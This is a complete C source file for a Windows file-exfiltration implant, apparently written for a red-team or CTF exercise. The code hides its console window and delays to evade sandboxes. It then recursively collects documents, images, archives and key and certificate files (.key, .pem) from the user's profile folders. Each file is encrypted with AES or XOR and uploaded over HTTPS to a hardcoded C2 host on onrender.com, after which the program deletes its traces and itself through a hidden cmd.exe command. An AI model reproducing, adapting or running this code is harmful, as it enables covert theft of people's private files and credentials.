#include <windows.h>
#include <winhttp.h> // Keep this one
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <time.h>
#include <wincrypt.h>

// Remove wininet.lib
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")

// Configuration
#define SLEEP_SECONDS 30
#define MAX_PATH_LEN 512
#define C2_URL "https://redesigned-eureka-oz60.onrender.com/upload"
#define AES_KEY_SIZE 32  // 256-bit
#define AES_BLOCK_SIZE 16

// Simple XOR fallback (fast, but less secure - good for CTF)
void xor_encrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Windows CryptoAPI AES-256 encryption (native, no OpenSSL)
int encrypt_file_aes(const char* input_path, const char* output_path) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    FILE* in = NULL;
    FILE* out = NULL;
    unsigned char* buffer = NULL;
    long file_size;
    int success = 0;
    
    // Password derived key (in production, use better derivation)
    char password[] = "RedTeamCTF2025";
    DWORD password_len = strlen(password);
    
    // Open input file
    in = fopen(input_path, "rb");
    if (!in) return 0;
    
    fseek(in, 0, SEEK_END);
    file_size = ftell(in);
    fseek(in, 0, SEEK_SET);
    
    // Allocate buffer with padding for AES
    size_t padded_size = ((file_size + AES_BLOCK_SIZE - 1) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
    buffer = (unsigned char*)malloc(padded_size);
    if (!buffer) {
        fclose(in);
        return 0;
    }
    
    fread(buffer, 1, file_size, in);
    fclose(in);
    
    // Add PKCS#7 padding
    size_t pad_len = padded_size - file_size;
    for (size_t i = file_size; i < padded_size; i++) {
        buffer[i] = (unsigned char)pad_len;
    }
    
    // Initialize CryptoAPI
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        // Try creating a new key container
        if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
            free(buffer);
            return 0;
        }
    }
    
    // Create hash object
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return 0;
    }
    
    // Hash the password
    if (!CryptHashData(hHash, (BYTE*)password, password_len, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return 0;
    }
    
    // Derive AES key from hash
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return 0;
    }
    
    // Open output file
    out = fopen(output_path, "wb");
    if (!out) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return 0;
    }
    
    // Write original size (for decryption)
    fwrite(&file_size, sizeof(long), 1, out);
    
    // Encrypt
    DWORD encrypted_len = padded_size;
    if (CryptEncrypt(hKey, 0, TRUE, 0, buffer, &encrypted_len, padded_size)) {
        fwrite(buffer, 1, encrypted_len, out);
        success = 1;
    }
    
    fclose(out);
    free(buffer);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    return success;
}

// Simplified XOR encryption (fallback if AES fails)
int encrypt_file_xor(const char* input_path, const char* output_path) {
    FILE* in = fopen(input_path, "rb");
    if (!in) return 0;
    
    fseek(in, 0, SEEK_END);
    long size = ftell(in);
    fseek(in, 0, SEEK_SET);
    
    unsigned char* buffer = (unsigned char*)malloc(size);
    if (!buffer) {
        fclose(in);
        return 0;
    }
    
    fread(buffer, 1, size, in);
    fclose(in);
    
    // XOR with 0xAA (simple obfuscation)
    for (long i = 0; i < size; i++) {
        buffer[i] ^= 0xAA;
    }
    
    FILE* out = fopen(output_path, "wb");
    if (!out) {
        free(buffer);
        return 0;
    }
    
    fwrite(buffer, 1, size, out);
    fclose(out);
    free(buffer);
    
    return 1;
}

// Smart encryption: try AES first, fallback to XOR
int encrypt_file(const char* input_path, const char* output_path) {
    if (encrypt_file_aes(input_path, output_path)) {
        return 1;  // AES succeeded
    }
    // Fallback to XOR if CryptoAPI fails
    return encrypt_file_xor(input_path, output_path);
}

// Send file to C2 via HTTPS
int send_to_c2(const char* filepath) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    FILE* fp = NULL;
    BYTE* buffer = NULL;
    long file_size;
    int success = 0;
    
    fp = fopen(filepath, "rb");
    if (!fp) return 0;
    
    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    buffer = (BYTE*)malloc(file_size);
    if (!buffer) {
        fclose(fp);
        return 0;
    }
    
    fread(buffer, 1, file_size, fp);
    fclose(fp);
    
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (hSession) {
        hConnect = WinHttpConnect(hSession, L"redesigned-eureka-oz60.onrender.com", 
                                   INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/upload", 
                                          NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                LPCWSTR headers = L"Content-Type: application/octet-stream\r\n";
                if (WinHttpSendRequest(hRequest, headers, wcslen(headers), 
                                       buffer, file_size, file_size, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        success = 1;
                        printf("[+] Sent: %s (%ld bytes)\n", filepath, file_size);
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    
    free(buffer);
    return success;
}

// Sleep to avoid sandbox detection
void initial_delay() {
    printf("[*] Initializing...\n");
    Sleep(SLEEP_SECONDS * 1000);
}

// Get temp directory
void get_temp_path(char* temp_path) {
    GetTempPathA(MAX_PATH_LEN, temp_path);
    strcat(temp_path, "syscache\\");
    CreateDirectoryA(temp_path, NULL);
}

// Check if file should be targeted
int is_target_file(const char* filename) {
    const char* extensions[] = {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", 
                                 ".ppt", ".pptx", ".rtf", ".odt", ".csv", ".conf",
                                 ".cfg", ".key", ".pem", ".crt", ".log", ".jpg", 
                                 ".png", ".zip", ".rar", ".7z"};
    int num_ext = sizeof(extensions) / sizeof(extensions[0]);
    
    const char* dot = strrchr(filename, '.');
    if (!dot) return 0;
    
    for (int i = 0; i < num_ext; i++) {
        if (_stricmp(dot, extensions[i]) == 0) return 1;
    }
    return 0;
}

// Walk directory recursively
void walk_directory(const char* dir_path, const char* temp_path, int* count) {
    DIR* dir;
    struct dirent* entry;
    struct stat st;
    char full_path[MAX_PATH_LEN];
    char encrypted_path[MAX_PATH_LEN];
    
    dir = opendir(dir_path);
    if (!dir) return;
    
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        
        snprintf(full_path, sizeof(full_path), "%s\\%s", dir_path, entry->d_name);
        
        if (stat(full_path, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                walk_directory(full_path, temp_path, count);
            } else if (is_target_file(entry->d_name)) {
                snprintf(encrypted_path, sizeof(encrypted_path), "%s%ld_%s.enc", 
                         temp_path, time(NULL), entry->d_name);
                
                printf("[*] Encrypting: %s\n", entry->d_name);
                if (encrypt_file(full_path, encrypted_path)) {
                    printf("[*] Sending...\n");
                    if (send_to_c2(encrypted_path)) {
                        (*count)++;
                        DeleteFileA(encrypted_path);
                    }
                }
                Sleep(500);
            }
        }
    }
    closedir(dir);
}

// Get target directories
void get_target_paths(char paths[][MAX_PATH_LEN], int* num_paths) {
    char user_profile[MAX_PATH_LEN];
    *num_paths = 0;
    
    GetEnvironmentVariableA("USERPROFILE", user_profile, MAX_PATH_LEN);
    
    snprintf(paths[(*num_paths)++], MAX_PATH_LEN, "%s\\Documents", user_profile);
    snprintf(paths[(*num_paths)++], MAX_PATH_LEN, "%s\\Desktop", user_profile);
    snprintf(paths[(*num_paths)++], MAX_PATH_LEN, "%s\\Downloads", user_profile);
    snprintf(paths[(*num_paths)++], MAX_PATH_LEN, "%s\\Pictures", user_profile);
    snprintf(paths[(*num_paths)++], MAX_PATH_LEN, "%s\\Music", user_profile);
}

// Self-delete
void self_delete() {
    char cmd[MAX_PATH_LEN];
    char module_path[MAX_PATH_LEN];
    
    GetModuleFileNameA(NULL, module_path, MAX_PATH_LEN);
    snprintf(cmd, sizeof(cmd), 
             "cmd.exe /c timeout /t 3 /nobreak > nul & del \"%s\"", module_path);
    
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    char temp_path[MAX_PATH_LEN];
    char target_paths[10][MAX_PATH_LEN];
    int num_paths, total_files = 0;
    
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Stealth delay
    initial_delay();
    
    get_temp_path(temp_path);
    get_target_paths(target_paths, &num_paths);
    
    printf("[*] Starting file capture...\n");
    
    for (int i = 0; i < num_paths; i++) {
        if (GetFileAttributesA(target_paths[i]) != INVALID_FILE_ATTRIBUTES) {
            printf("[*] Scanning: %s\n", target_paths[i]);
            walk_directory(target_paths[i], temp_path, &total_files);
        }
    }
    
    printf("[+] Completed: %d files exfiltrated\n", total_files);
    
    // Cleanup
    char rm_cmd[MAX_PATH_LEN];
    snprintf(rm_cmd, sizeof(rm_cmd), "rmdir /s /q \"%s\"", temp_path);
    system(rm_cmd);
    
    if (total_files > 0) {
        self_delete();
    }
    
    return 0;
}
